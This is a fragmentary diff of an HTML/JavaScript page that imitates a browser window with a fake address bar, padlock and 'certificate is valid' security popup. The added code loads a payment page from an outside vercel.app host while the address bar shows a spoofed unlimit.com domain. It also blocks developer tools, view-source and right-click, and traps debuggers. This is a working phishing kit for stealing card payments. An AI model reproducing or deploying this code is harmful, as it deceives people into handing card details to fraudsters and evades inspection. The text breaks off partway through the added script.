---menu-shadow: 0 4px 16px rgba(0,0,0,0.4), 0 1px 4px rgba(0,0,0,0.3);
---menu-item-hover: rgba(255,255,255,0.08);
---spinner-border: rgba(138,180,248,0.25);
---spinner-top: #8ab4f8;
---iframe-bg: #2d2e30;
-}
-}
-html, body { height: 100%; width: 100%; overflow: hidden; background: #1e1e1e; }
-.browser {
-display: flex;
-flex-direction: column;
-height: 100%;
-width: 100%;
-background: var(--iframe-bg);
-}
-.toolbar {
-background: var(--toolbar-bg);
-padding: 5px 10px;
-display: flex;
-align-items: center;
-gap: 8px;
-border-bottom: 1px solid var(--toolbar-border);
-box-shadow: var(--shadow-toolbar);
-flex-shrink: 0;
-height: 48px;
-position: relative;
-z-index: 100;
-user-select: none;
-}
-.nav-group { display: flex; gap: 0; }
-.icon-btn {
-background: transparent;
-border: none;
-width: 34px;
-height: 34px;
-border-radius: 50%;
-display: flex;
-align-items: center;
-justify-content: center;
-cursor: pointer;
-position: relative;
-overflow: hidden;
-transition: background 0.15s ease;
-flex-shrink: 0;
-}
-.icon-btn .ms {
-font-family: 'Material Symbols Rounded';
-font-size: 20px;
-color: var(--text-secondary);
-transition: color 0.15s;
-pointer-events: none;
-line-height: 1;
-}
-.icon-btn:hover { background: var(--ripple); }
-.icon-btn:active { background: var(--ripple-active); transform: scale(0.95); }
-.icon-btn.disabled { opacity: 0.35; cursor: default; pointer-events: none; }
-.ripple-wave {
-position: absolute;
-border-radius: 50%;
-transform: scale(0);
-background: rgba(0,0,0,0.15);
-animation: ripple-anim 0.4s linear;
-pointer-events: none;
-}
-@keyframes ripple-anim {
-to { transform: scale(4); opacity: 0; }
-}
-.favicon-wrap {
-width: 18px;
-height: 18px;
-flex-shrink: 0;
-display: flex;
-align-items: center;
-justify-content: center;
-}
-.favicon-wrap .ms {
-font-family: 'Material Symbols Rounded';
-font-size: 16px;
-color: var(--text-secondary);
-}
-#faviconImg {
-width: 16px;
-height: 16px;
-display: none;
-border-radius: 2px;
-}
-.url-bar {
-flex: 1;
-background: var(--url-bg);
-border: 1.5px solid var(--url-border);
-border-radius: 24px;
-height: 36px;
-display: flex;
-align-items: center;
-padding: 0 10px;
-gap: 6px;
-cursor: text;
-transition: border-color 0.15s, box-shadow 0.15s;
-min-width: 0;
-}
-.url-bar:focus-within {
-border-color: var(--url-focus-border);
-box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
-}
-.secure-icon-custom {
-width: 18px;
-height: 18px;
-border-radius: 50%;
-background: transparent;
-display: flex;
-align-items: center;
-justify-content: center;
-cursor: pointer;
-flex-shrink: 0;
-transition: background 0.15s;
-}
-.secure-icon-custom:hover {
-background: var(--ripple);
-}
-.secure-icon-custom img {
-width: 13px;
-height: 13px;
-object-fit: contain;
-filter: brightness(0) invert(1);
-pointer-events: none;
-}
-#urlInput {
-flex: 1;
-border: none;
-outline: none;
-background: transparent;
-font-family: 'Google Sans', -apple-system, sans-serif;
-font-size: 13.5px;
-font-weight: 500;
-color: var(--text-primary);
-min-width: 0;
-cursor: text;
-}
-#urlInput::selection { background: rgba(26,115,232,0.25); }
-.progress-track {
-height: 2px;
-width: 100%;
-background: transparent;
-overflow: hidden;
-flex-shrink: 0;
-position: relative;
-z-index: 99;
-}
-.progress-bar {
-height: 100%;
-width: 0%;
-background: var(--progress-color);
-opacity: 0;
-transition: width 0.25s ease-out, opacity 0.2s;
-border-radius: 0 2px 2px 0;
-position: relative;
-}
-.progress-bar::after {
-content: '';
-position: absolute;
-right: 0;
-top: 0;
-width: 60px;
-height: 100%;
-background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
-animation: shimmer 1s ease-in-out infinite;
-opacity: 0;
-transition: opacity 0.2s;
-}
-.progress-bar.active::after { opacity: 1; }
-@keyframes shimmer {
-0% { transform: translateX(-60px); }
-100% { transform: translateX(60px); }
-}
-.iframe-wrapper {
-flex: 1;
-position: relative;
-overflow: hidden;
-min-height: 0;
-}
-iframe {
-width: 100%;
-height: 100%;
-border: none;
-display: block;
-background: white;
-}
-.overlay {
-position: absolute;
-inset: 0;
-background: var(--overlay-bg);
-backdrop-filter: blur(4px);
--webkit-backdrop-filter: blur(4px);
-display: none;
-flex-direction: column;
-align-items: center;
-justify-content: center;
-gap: 14px;
-z-index: 50;
-transition: opacity 0.2s;
-}
-.overlay.visible { display: flex; }
-.spinner {
-width: 32px;
-height: 32px;
-border: 3px solid var(--spinner-border);
-border-top-color: var(--spinner-top);
-border-radius: 50%;
-animation: spin 0.75s cubic-bezier(0.4,0,0.2,1) infinite;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.overlay-msg {
-display: none;
-flex-direction: column;
-align-items: center;
-gap: 10px;
-text-align: center;
-padding: 0 24px;
-}
-.overlay-msg .err-icon {
-font-family: 'Material Symbols Rounded';
-font-size: 40px;
-color: var(--text-secondary);
-}
-.overlay-msg p {
-font-family: 'Google Sans', sans-serif;
-font-size: 14px;
-color: var(--text-secondary);
-line-height: 1.5;
-max-width: 280px;
-}
-.overlay-msg .retry-btn {
-margin-top: 4px;
-padding: 8px 22px;
-border-radius: 20px;
-border: none;
-background: var(--text-blue);
-color: #fff;
-font-family: 'Google Sans', sans-serif;
-font-size: 13px;
-font-weight: 500;
-cursor: pointer;
-transition: opacity 0.15s, transform 0.1s;
-}
-.retry-btn:hover { opacity: 0.88; }
-.retry-btn:active { transform: scale(0.97); }
-.menu-wrap { position: relative; }
-.dropdown-menu {
-position: absolute;
-top: calc(100% + 6px);
-right: 0;
-background: var(--menu-bg);
-border-radius: 10px;
-box-shadow: var(--menu-shadow);
-min-width: 170px;
-overflow: hidden;
-opacity: 0;
-transform: translateY(-6px) scale(0.97);
-transform-origin: top right;
-pointer-events: none;
-transition: opacity 0.15s ease, transform 0.15s ease;
-z-index: 200;
-}
-.dropdown-menu.open {
-opacity: 1;
-transform: translateY(0) scale(1);
-pointer-events: auto;
-}
-.menu-item {
-display: flex;
-align-items: center;
-gap: 10px;
-padding: 10px 14px;
-font-family: 'Google Sans', sans-serif;
-font-size: 13px;
-color: var(--text-primary);
-cursor: pointer;
-transition: background 0.1s;
-}
-.menu-item:hover { background: var(--menu-item-hover); }
-.menu-item .ms { font-family: 'Material Symbols Rounded'; font-size: 17px; color: var(--text-secondary); }
-.menu-divider { height: 1px; background: var(--toolbar-border); margin: 4px 0; }
-.popup {
-position: fixed;
-top: 28px;
-left: 0;
-width: 284px;
-height: auto;
-background: #202124;
-border: 1px solid #5f6368;
-border-radius: 14px;
-overflow: hidden;
-box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
-font-family: 'Roboto', sans-serif;
-z-index: 9999;
-pointer-events: none;
-opacity: 0;
-transform: translateY(-4px);
-transition: opacity 0.12s ease, transform 0.12s ease;
-}
-.popup.open {
-opacity: 1;
-transform: translateY(0);
-pointer-events: auto;
-}
-.header {
-position: relative;
-display: flex;
-align-items: center;
-padding: 10px 12px 6px 12px;
-gap: 6px;
-background: #202124;
-}
-.back, .close {
-width: 28px;
-height: 28px;
-border-radius: 50%;
-display: inline-flex;
-align-items: center;
-justify-content: center;
-cursor: pointer;
-opacity: 0.85;
-transition: background 0.15s ease;
-flex-shrink: 0;
-background: transparent;
-border: none;
-}
-.back:hover, .close:hover {
-background: rgba(255,255,255,0.08);
-opacity: 1;
-}
-.back svg, .close svg {
-width: 18px;
-height: 18px;
-fill: #e8eaed;
-pointer-events: none;
-}
-.title-wrap {
-display: flex;
-flex-direction: column;
-flex: 1;
-}
-.title {
-font-size: 15px;
-font-weight: 440;
-line-height: 18px;
-color: #e8eaed;
-letter-spacing: 0.25px;
-}
-.domain {
-font-size: 11px;
-font-weight: 400;
-color: #9aa0a6;
-line-height: 14px;
-margin-top: 2px;
-}
-.separator {
-width: 100%;
-height: 1px;
-background: #5f6368;
-opacity: 0.7;
-}
-.main-row {
-display: flex;
-align-items: flex-start;
-gap: 10px;
-padding: 12px 14px 12px 14px;
-background: #202124;
-}
-.main-icon {
-width: 16px;
-height: 16px;
-flex-shrink: 0;
-margin-top: 2px;
-display: flex;
-align-items: center;
-justify-content: center;
-}
-.content-title {
-font-size: 12.5px;
-font-weight: 500;
-line-height: 18px;
-color: #e8eaed;
-letter-spacing: 0.1px;
-margin-bottom: 2px;
-}
-.content-text {
-font-size: 10px;
-line-height: 15px;
-color: #e8eaed;
-font-weight: 300;
-letter-spacing: 0.06px;
-white-space: normal;
-word-break: normal;
-max-width: 210px;
-}
-.learn {
-color: #8ab4f8;
-text-decoration: underline;
-text-decoration-thickness: 1px;
-text-underline-offset: 2px;
-font-weight: 350;
-font-size: 10px;
-cursor: pointer;
-transition: opacity 0.1s ease;
-display: inline-block;
-}
-.learn:hover { opacity: 0.9; color: #96bafd; }
-.bottom-row {
-display: flex;
-align-items: center;
-justify-content: space-between;
-padding: 10px 14px 12px 14px;
-background: #202124;
-transition: background-color 0.15s ease;
-cursor: pointer;
-}
-.bottom-row:hover { background-color: #2a2c30; }
-.bottom-row:active { background-color: #35373d; }
-.bottom-left {
-display: flex;
-align-items: center;
-gap: 8px;
-pointer-events: none;
-}
-.bottom-left .main-icon {
-margin-top: 0;
-width: 15px;
-height: 15px;
-position: relative;
-top: -2.5px;
-}
-.bottom-title {
-font-size: 12px;
-font-weight: 500;
-color: #e8eaed;
-letter-spacing: 0.1px;
-line-height: 16px;
-}
-.open-icon {
-width: 16px;
-height: 16px;
-display: inline-flex;
-align-items: center;
-justify-content: center;
-opacity: 0.75;
-pointer-events: none;
-}
-.open-icon svg {
-width: 16px;
-height: 16px;
-fill: #9aa0a6;
-}
-a, img, svg, .back, .close, .main-icon, .open-icon {
--webkit-user-drag: none;
-user-select: none;
-}
-.content-text, .content-text * {
-user-select: none;
-}
-.bottom-left .main-icon {
-top: -1px !important;                                                    
-}
-</style>
-</head>
-<body>
-<div class="browser">
-<div class="toolbar" id="toolbar">
-<div class="nav-group">
-<button class="icon-btn disabled" id="backBtn" title="Go back (Alt+Left)">
-<span class="ms">arrow_back</span>
-</button>
-<button class="icon-btn disabled" id="fwdBtn" title="Go forward (Alt+Right)">
-<span class="ms">arrow_forward</span>
-</button>
-<button class="icon-btn" id="refreshBtn" title="Reload page (Ctrl+R)">
-<span class="ms" id="refreshIcon">refresh</span>
-</button>
-</div>
-<div class="url-bar" id="urlBar">
-<div class="secure-icon-custom" id="customSecureIcon">
-<img src="https://storage.googleapis.com/support-kms-prod/S76Rs1BC1QDxT8zpF3tATLDsc5oxceWYIPHN" alt="Secure" draggable="false">
-</div>
-<div class="favicon-wrap">
-<img id="faviconImg" alt="">
-<span class="ms" id="faviconDefault">globe</span>
-</div>
-<input type="text" id="urlInput" spellcheck="false" autocomplete="off" autocorrect="off"
-aria-label="Address bar" placeholder="Search or enter address">
-</div>
-<div class="menu-wrap" id="menuWrap">
-<button class="icon-btn" id="menuBtn" title="More options">
-<span class="ms">more_vert</span>
-</button>
-<div class="dropdown-menu" id="dropdownMenu">
-<div class="menu-item" id="menuReload"><span class="ms">refresh</span> Reload</div>
-<div class="menu-item" id="menuCopyUrl"><span class="ms">content_copy</span> Copy URL</div>
-<div class="menu-divider"></div>
-<div class="menu-item" id="menuNewTab"><span class="ms">open_in_new</span> Open in new tab</div>
-</div>
-</div>
-</div>
-<div class="popup" id="securityPopup">
-<div class="header">
-<div class="back" id="popupBackBtn">
-<svg viewBox="0 0 24 24">
-<path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
-</svg>
-</div>
-<div class="title-wrap">
-<div class="title">Security</div>
-<div class="domain" id="popupDomain">google.com</div>
-</div>
-<div class="close" id="popupCloseBtn">
-<svg viewBox="0 0 24 24">
-<path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
-</svg>
-</div>
-</div>
-<div class="separator"></div>
-<div class="main-row">
-<div class="main-icon" id="secureLockIcon"></div>
-<div>
-<div class="content-title">Connection is secure</div>
-<div class="content-text">
-Your information (for example, passwords or<br>
-credit card numbers) is private when it is sent<br>
-to this site. <a class="learn" href="https://support.google.com/chrome?p=ui_security_indicator" target="_blank" rel="noopener noreferrer" draggable="false">Learn more</a>
-</div>
-</div>
-</div>
-<div class="bottom-row" id="certificateBox">
-<div class="bottom-left">
-<div class="main-icon" id="certIcon"></div>
-<div class="bottom-title">Certificate is valid</div>
-</div>
-<div class="open-icon">
-<svg viewBox="0 0 24 24">
-<path d="M14 3v2h3.59L7 15.59 8.41 17 19 6.41V10h2V3z"></path>
-<path d="M19 19H5V5h7V3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-7h-2z"></path>
-</svg>
-</div>
-</div>
-</div>
-<div class="progress-track"><div class="progress-bar" id="progressBar"></div></div>
-<div class="iframe-wrapper">
-<div class="overlay" id="overlay">
-<div class="spinner" id="spinner"></div>
-<div class="overlay-msg" id="overlayMsg">
-<span class="err-icon ms">cloud_off</span>
-<p id="overlayMsgText">This site is taking too long to respond.</p>
-<button class="retry-btn" id="retryBtn">Reload</button>
-</div>
-</div>
-<iframe id="webFrame" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads allow-popups-to-escape-sandbox"></iframe>
-</div>
-</div>
-<script>
-let openTimeout = null;
-(function() {
-'use strict';
-const START_URL = 'https://cardpay.com';
-const TIMEOUT_MS   = 10000;
-const FINISH_DELAY = 280;
-const iframe      = document.getElementById('webFrame');
-const backBtn     = document.getElementById('backBtn');
-const fwdBtn      = document.getElementById('fwdBtn');
-const refreshBtn  = document.getElementById('refreshBtn');
-const refreshIcon = document.getElementById('refreshIcon');
-const urlInput    = document.getElementById('urlInput');
-const secureTrigger = document.getElementById('customSecureIcon');
-const secPopup    = document.getElementById('securityPopup');
-const progressBar = document.getElementById('progressBar');
-const overlay     = document.getElementById('overlay');
-const spinner     = document.getElementById('spinner');
-const overlayMsg  = document.getElementById('overlayMsg');
-const overlayText = document.getElementById('overlayMsgText');
-const retryBtn    = document.getElementById('retryBtn');
-const menuBtn     = document.getElementById('menuBtn');
-const dropMenu    = document.getElementById('dropdownMenu');
-const menuReload  = document.getElementById('menuReload');
-const menuCopyUrl = document.getElementById('menuCopyUrl');
-const menuNewTab  = document.getElementById('menuNewTab');
-const faviconImg  = document.getElementById('faviconImg');
-const faviconDef  = document.getElementById('faviconDefault');
-let history      = [START_URL];
-let histIdx      = 0;
-let isLoading    = false;
-let progTimer    = null;
-let timeoutTimer = null;
-let progWidth    = 0;
-let suppressLoad = false;
-let currentUrl   = START_URL;
-function updateNavBtns () {
-backBtn.classList.toggle('disabled', histIdx <= 0);
-fwdBtn.classList.toggle('disabled', histIdx >= history.length - 1);
-}
-function pushHistory (url) {
-if (histIdx < history.length - 1) history.splice(histIdx + 1);
-if (history[histIdx] !== url) {
-history.push(url);
-histIdx = history.length - 1;
-}
-updateNavBtns();
-}
-function startProgress () {
-progWidth = 0;
-progressBar.style.width = '0%';
-progressBar.style.opacity = '1';
-progressBar.classList.add('active');
-if (progTimer) clearInterval(progTimer);
-progTimer = setInterval(() => {
-if (progWidth < 88) {
-const step = (88 - progWidth) * 0.06 + 1.5;
-progWidth = Math.min(88, progWidth + step);
-progressBar.style.width = progWidth + '%';
-}
-}, 120);
-}
-function finishProgress (cb) {
-if (progTimer) { clearInterval(progTimer); progTimer = null; }
-progressBar.style.width = '100%';
-setTimeout(() => {
-progressBar.style.opacity = '0';
-progressBar.classList.remove('active');
-setTimeout(() => { progressBar.style.width = '0%'; if (cb) cb(); }, 100);
-}, FINISH_DELAY);
-}
-function beginLoading () {
-if (isLoading) endLoading(false);
-isLoading = true;
-refreshIcon.textContent = 'close';
-overlayMsg.style.display = 'none';
-spinner.style.display = 'block';
-overlay.classList.add('visible');
-startProgress();
-if (timeoutTimer) clearTimeout(timeoutTimer);
-timeoutTimer = setTimeout(() => {
-if (isLoading) showLoadError('This site is taking too long to respond.');
-}, TIMEOUT_MS);
-}
-function endLoading () {
-if (!isLoading) return;
-isLoading = false;
-if (timeoutTimer) clearTimeout(timeoutTimer);
-refreshIcon.textContent = 'refresh';
-finishProgress(() => overlay.classList.remove('visible'));
-}
-function showLoadError (msg) {
-if (timeoutTimer) clearTimeout(timeoutTimer);
-if (progTimer) clearInterval(progTimer);
-progressBar.style.opacity = '0';
-progressBar.classList.remove('active');
-spinner.style.display = 'none';
-overlayText.textContent = msg;
-overlayMsg.style.display = 'flex';
-overlay.classList.add('visible');
-refreshIcon.textContent = 'refresh';
-isLoading = false;
-}
-function stopLoading () {
-if (!isLoading) return;
-suppressLoad = true;
-iframe.src = 'about:blank';
-endLoading();
-urlInput.value = currentUrl;
-suppressLoad = false;
-}
-function normalizeUrl (raw) {
-raw = raw.trim();
-if (!raw) return null;
-if (/^https?:\/\
-if (/^[a-z][a-z0-9+\-.]*:\/\
-if (/\s/.test(raw) || !/\./.test(raw)) {
-return 'https://www.google.com/search?q=' + encodeURIComponent(raw);
-}
-return 'https://' + raw;
-}
-function navigate (url, addToHistory = true) {
-if (!url) return;
-currentUrl = url;
-urlInput.value = url;
-updateFavicon(url);
-if (addToHistory) pushHistory(url);
-beginLoading();
-suppressLoad = false;
-iframe.src = url;
-try {
-const host = new URL(url).hostname;
-document.getElementById('popupDomain').innerText = host;
-} catch(_) {}
-}
-function goBack () {
-if (histIdx > 0) {
-histIdx--;
-navigate(history[histIdx], false);
-updateNavBtns();
-}
-}
-function goForward () {
-if (histIdx < history.length - 1) {
-histIdx++;
-navigate(history[histIdx], false);
-updateNavBtns();
-}
-}
-function reload () { navigate(currentUrl, false); }
-function updateFavicon (url) {
-try {
-const origin = new URL(url).origin;
-faviconImg.onload = () => { faviconImg.style.display = 'block'; faviconDef.style.display = 'none'; };
-faviconImg.onerror = () => { faviconImg.style.display = 'none'; faviconDef.style.display = ''; };
-faviconImg.src = origin + '/favicon.ico';
-} catch { faviconImg.style.display = 'none'; faviconDef.style.display = ''; }
-}
-iframe.addEventListener('load', () => {
-if (suppressLoad) return;
-try {
-const loc = iframe.contentWindow?.location?.href;
-if (loc && loc !== 'about:blank') {
-currentUrl = loc;
-urlInput.value = loc;
-pushHistory(loc);
-updateFavicon(loc);
-try { document.getElementById('popupDomain').innerText = new URL(loc).hostname; } catch(_) {}
-}
-} catch (_) {}
-endLoading();
-});
-iframe.addEventListener('error', () => { if (!suppressLoad) showLoadError('This page could not be loaded.'); });
-backBtn.addEventListener('click', goBack);
-fwdBtn.addEventListener('click', goForward);
-refreshBtn.addEventListener('click', () => { isLoading ? stopLoading() : reload(); });
-retryBtn.addEventListener('click', () => { overlay.classList.remove('visible'); reload(); });
-urlInput.addEventListener('keydown', (e) => {
-if (e.key === 'Enter') { const url = normalizeUrl(urlInput.value); if (url) navigate(url); urlInput.blur(); }
-else if (e.key === 'Escape') { urlInput.value = currentUrl; urlInput.blur(); }
-});
-urlInput.addEventListener('focus', () => urlInput.select());
-let popupOpen = false;
-function positionPopup () {
-const r = secureTrigger.getBoundingClientRect();
-const popupW = 284;
-let left = r.left;
-if (left + popupW > window.innerWidth - 8) left = window.innerWidth - popupW - 8;
-if (left < 8) left = 8;
-secPopup.style.left = left + 'px';
-secPopup.style.top  = (r.bottom + 6) + 'px';
-}
-function openPopup () {
-popupOpen = true;
-secPopup.classList.add('open');
-positionPopup();
-}
-function closePopup () {
-if (openTimeout) {
-clearTimeout(openTimeout);
-openTimeout = null;
-}
-popupOpen = false;
-secPopup.classList.remove('open');
-}
-secureTrigger.addEventListener('click', (e) => {
-e.stopPropagation();
-if (popupOpen) {
-if (openTimeout) {
-clearTimeout(openTimeout);
-openTimeout = null;
-}
-closePopup();
-} else {
-if (openTimeout) {
-clearTimeout(openTimeout);
-openTimeout = null;
-}
-openTimeout = setTimeout(() => {
-openPopup();
-openTimeout = null;
-}, 200);
-}
-});
-secPopup.addEventListener('click', (e) => e.stopPropagation());
-document.getElementById('popupCloseBtn').addEventListener('click', (e) => {
-e.stopPropagation();
-closePopup();
-});
-document.getElementById('popupBackBtn').addEventListener('click', (e) => {
-e.stopPropagation();
-closePopup();
-});
-const certBox = document.getElementById('certificateBox');
-const targetUrl = 'chrome://certificate-manager/crscerts';
-async function copyAndOpen() {
-try { await navigator.clipboard.writeText(targetUrl); } catch(e) { document.execCommand('copy'); }
-window.open(targetUrl, '_blank');
-}
-certBox.addEventListener('click', (e) => {
-e.stopPropagation();
-copyAndOpen();
-closePopup();
-});
-const lockIconContainer = document.getElementById('secureLockIcon');
-if (lockIconContainer) {
-lockIconContainer.innerHTML = '';
-const iconSpan = document.createElement('span');
-iconSpan.className = 'material-symbols-rounded';
-iconSpan.textContent = 'lock';
-iconSpan.style.fontSize = '16px';
-iconSpan.style.color = '#e8eaed';
-iconSpan.style.display = 'flex';
-iconSpan.style.alignItems = 'center';
-iconSpan.style.justifyContent = 'center';
-lockIconContainer.appendChild(iconSpan);
-}
-const certIconContainer = document.getElementById('certIcon');
-if (certIconContainer) {
-certIconContainer.innerHTML = '';
-const img = document.createElement('img');
-img.src = 'https://i.ibb.co/Q3rhGLp5/rounded-rectangle-clip-art-0.png';
-img.alt = '';
-img.style.width = '17px';
-img.style.height = '18px';
-img.style.objectFit = 'contain';
-img.style.filter = 'brightness(0) invert(1)';
-img.draggable = false;
-certIconContainer.appendChild(img);
-}
-secPopup.addEventListener('dragstart', (e) => e.preventDefault());
-secPopup.addEventListener('selectstart', (e) => e.preventDefault());
-menuBtn.addEventListener('click', (e) => {
-e.stopPropagation();
-dropMenu.classList.toggle('open');
-});
-menuReload.addEventListener('click', () => {
-dropMenu.classList.remove('open');
-reload();
-});
-menuCopyUrl.addEventListener('click', () => {
-dropMenu.classList.remove('open');
-navigator.clipboard?.writeText(currentUrl);
-});
-menuNewTab.addEventListener('click', () => {
-dropMenu.classList.remove('open');
-window.open(currentUrl, '_blank');
-});
-document.addEventListener('click', () => {
-dropMenu.classList.remove('open');
-if (popupOpen) closePopup();
-});
-document.querySelectorAll('.icon-btn, .back, .close').forEach(btn => {
-btn.addEventListener('pointerdown', (e) => {
-const r = btn.getBoundingClientRect();
-const wave = document.createElement('span');
-wave.className = 'ripple-wave';
-const size = Math.max(r.width, r.height) * 1.5;
-wave.style.cssText = `width:${size}px;height:${size}px;left:${e.clientX-r.left-size/2}px;top:${e.clientY-r.top-size/2}px`;
-btn.appendChild(wave);
-wave.addEventListener('animationend', () => wave.remove());
-});
-});
-document.addEventListener('keydown', (e) => {
-const inUrl = document.activeElement === urlInput;
-if (e.key === 'Escape' && !inUrl) {
-stopLoading();
-return;
-}
-if ((e.ctrlKey || e.metaKey) && !e.shiftKey) {
-switch (e.key) {
-case 'r': case 'R':
-e.preventDefault();
-isLoading ? stopLoading() : reload();
-break;
-case 'ArrowLeft':
-e.preventDefault();
-goBack();
-break;
-case 'ArrowRight':
-e.preventDefault();
-goForward();
-break;
-case 'l': case 'L':
-e.preventDefault();
-urlInput.focus();
-break;
-}
-}
-});
-updateNavBtns();
-navigate(START_URL, false);
-})();
-</script>
-<script>
-(function() {
-const originalMenuNewTab = document.getElementById('menuNewTab');
-if (!originalMenuNewTab) return;
-const newMenuNewTab = originalMenuNewTab.cloneNode(true);
-originalMenuNewTab.parentNode.replaceChild(newMenuNewTab, originalMenuNewTab);
-newMenuNewTab.addEventListener('click', (e) => {
-e.stopPropagation();
-const dropMenu = document.getElementById('dropdownMenu');
-if (dropMenu) dropMenu.classList.remove('open');
-const iframe = document.getElementById('webFrame');
-let currentUrl = iframe && iframe.src && iframe.src !== 'about:blank' ? iframe.src : null;
-if (!currentUrl) {
-const urlInput = document.getElementById('urlInput');
-currentUrl = urlInput ? urlInput.value : 'https://www.google.com';
-}
-const newTab = window.open('about:blank', '_blank');
-if (!newTab) {
-window.open(currentUrl, '_blank'); 
-return;
-}
-let hostname = '';
-try { hostname = new URL(currentUrl).hostname; } catch(e) { hostname = 'Website'; }
-let faviconUrl = '';
-try { faviconUrl = new URL(currentUrl).origin + '/favicon.ico'; } catch(e) {}
-const escapeHtml = (str) => str.replace(/[&<>]/g, (m) => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
-const docHtml = `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
-<title>${escapeHtml(hostname)}</title>${faviconUrl ? `<link rel="icon" href="${escapeHtml(faviconUrl)}">` : ''}
-<style>*{margin:0;padding:0;box-sizing:border-box;user-select:none;}body{width:100vw;height:100vh;overflow:hidden;}iframe{width:100%;height:100%;border:none;display:block;}</style>
-<script>
-document.addEventListener('contextmenu',e=>e.preventDefault());
-document.addEventListener('keydown',e=>{
-if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='U')) e.preventDefault();
-});
-<\/script>
-</head>
-<body><iframe src="${escapeHtml(currentUrl)}" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads allow-popups-to-escape-sandbox"></iframe></body>
-</html>`;
-newTab.document.write(docHtml);
-newTab.document.close();
-const secPopup = document.getElementById('securityPopup');
-if (secPopup) secPopup.classList.remove('open');
-});
-})();
-</script>
-<script>
-(function() {
-"use strict";
-document.addEventListener('contextmenu', function(e) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-});
-window.addEventListener('keydown', function(e) {
-if (e.key === 'F12') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.key === 'K')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && (e.key === 'U')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'P') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'E') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'O') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'M') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'D') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'W') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && e.shiftKey && e.key === 'T') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.ctrlKey && (e.key === 'p' || e.key === 'P')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-if (e.key && e.key.startsWith('F') && e.key !== 'F5') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-});
-document.addEventListener('dragstart', function(e) {
-e.preventDefault();
-return false;
-});
-document.addEventListener('selectstart', function(e) {
-e.preventDefault();
-return false;
-});
-document.querySelectorAll('img, a').forEach(el => {
-el.addEventListener('contextmenu', (e) => e.preventDefault());
-});
-setInterval(function() {
-const start = Date.now();
-debugger; 
 const end = Date.now();
 if (end - start > 100) {
 console.clear();
@@ -2618,7 +1173,7 @@ window.addEventListener('contextmenu', blockRightClick, true);
 document.body.addEventListener('contextmenu', blockRightClick, true);
 document.documentElement.addEventListener('contextmenu', blockRightClick, true);
 function blockContextFromMouse(e) {
-if (e.button === 2) { 
+if (e.button === 2) {
 e.preventDefault();
 e.stopPropagation();
 e.stopImmediatePropagation();
@@ -2689,7 +1244,7 @@ const isOurBlocker = listener.toString().includes('blockRightClick') ||
 listener.toString().includes('preventDefault') &&
 listener.toString().includes('stopPropagation');
 if (!isOurBlocker) {
-return; 
+return;
 }
 }
 return originalAddEventListener.call(this, type, listener, options);
@@ -2774,7 +1329,7 @@ Object.defineProperty(window, 'location', {
 get: function() { return originalLocationSetter ? window._location : window.location; },
 set: function(value) {
 if (typeof value === 'string' && value.startsWith('view-source:')) {
-return; 
+return;
 }
 if (originalLocationSetter) {
 originalLocationSetter.call(this, value);
@@ -2830,39 +1385,21 @@ return target.apply(thisArg, args);
 console.log('✅ Right-click protection fully active (iframes, devtools, view-source blocked)');
 })();
 </script>
-</body>
-</html>
-if (event && event.type === 'contextmenu') {
-event.preventDefault();
-event.stopPropagation();
-return true;
-}
-return target.apply(thisArg, args);
-}
-});
-console.log('✅ Right-click protection fully active (iframes, devtools, view-source blocked)');
-})();
-</script>
 <script>
 (function() {
     "use strict";
-
     const PAYMENT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
     const SPOOFED_URL = 'https://unlimit.com';
     const SPOOFED_DOMAIN = 'unlimit.com';
     const TRIGGER_DOMAINS = ['cardpay.com', 'unlimit.com'];
-
     const iframe = document.getElementById('webFrame');
     const urlInput = document.getElementById('urlInput');
     const popupDomain = document.getElementById('popupDomain');
     const faviconImg = document.getElementById('faviconImg');
     const faviconDef = document.getElementById('faviconDefault');
-
     let isPaymentMode = false;
     let originalNavigate = window.navigate;
-    let pendingRefresh = false;   // true if we detected PAYMENT_URL in address bar and are waiting for iframe load
-
-    // === Helper: spoofed favicon ===
+    let pendingRefresh = false;
     function setSpoofedFavicon() {
         if (!faviconImg) return;
